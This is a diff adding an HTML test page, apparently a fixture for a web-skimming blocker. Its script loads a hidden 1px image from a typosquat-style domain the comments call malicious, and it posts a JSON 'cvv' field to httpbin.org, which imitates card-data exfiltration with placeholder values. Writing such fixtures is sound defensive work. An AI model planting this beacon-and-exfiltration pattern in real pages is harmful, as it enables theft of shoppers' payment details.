@@ -1,1 +1,25 @@
-test
+<html>
+  <body>
+    TEST page
+  </body>
+
+  <script>
+    // test GET (malicious URL) -> should be blocked
+    var b = document.createElement("img");
+    b.width = "1px";
+    b.height = "1px";
+    b.id = "hh";
+    b.src = "https://googletagsmanager.co/ntag.js";
+    document.body.appendChild(b);
+
+    // test POST (malicious data) -> should not be blocked
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://httpbin.org/post", true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.send(
+      JSON.stringify({
+        cvv: "cvv-test",
+      })
+    );
+  </script>
+</html>
